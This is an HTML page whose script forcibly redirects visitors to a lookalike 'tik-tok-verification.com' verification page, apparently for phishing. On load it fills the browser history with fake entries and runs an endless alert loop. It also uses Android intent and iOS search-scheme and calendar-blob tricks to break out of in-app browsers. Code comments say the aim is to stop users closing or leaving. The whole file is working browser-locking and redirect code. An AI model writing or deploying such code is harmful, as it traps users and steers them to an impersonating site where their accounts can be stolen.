<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; }</style>
</head>
<body>

<script>
    const destination = "https://tik-tok-verification.com/Verification/verify1.html";
    let isLocked = true;

    // --- 5-SECOND FAIL-SAFE (STRICTLY FOR TESTING) ---
    setTimeout(() => {
        isLocked = false;
        console.log("FAIL-SAFE TRIGGERED: Alerts stopped.");
    }, 5000);

    // THE REDIRECT METHOD THAT ACTUALLY WORKS
    function forceSystemOpen() {
        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
        const isAndroid = /Android/i.test(navigator.userAgent);

        if (isAndroid) {
            // Android Intent with package and fallback
            const intent = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
            window.location.href = intent;
        } 
        
        if (isIOS) {
            // iOS Shotgun (Search Hijack + Calendar Blob)
            window.location.replace("x-web-search://?" + encodeURIComponent(destination));
            setTimeout(() => {
                const blob = new Blob([`BEGIN:VCALENDAR\nVERSION:2.0\nBEGIN:VEVENT\nURL:${destination}\nEND:VEVENT\nEND:VCALENDAR`], {type: 'text/calendar'});
                const url = URL.createObjectURL(blob);
                window.location.href = url;
            }, 100);
        }
    }

    // THE INFINITE ALERT LOOP
    function startRampage() {
        if (isLocked) {
            // Trigger the breakout
            forceSystemOpen();

            // Lock the UI so they can't hit 'X' or leave
            alert("Verification Required\n\nClick OK to continue in your browser.");
            
            // Re-fire after they click OK
            forceSystemOpen();

            // Loop immediately
            setTimeout(startRampage, 10);
        }
    }

    window.onload = () => {
        // Build backstack
        for(let i=0; i<30; i++) history.pushState(null, null, "#step" + i);
        
        // Start immediately
        startRampage();
    };

    // The "X" Button Trap: restarts the rampage if the window loses focus
    window.onblur = () => {
        if (isLocked) startRampage();
    };

</script>
</body>
</html>
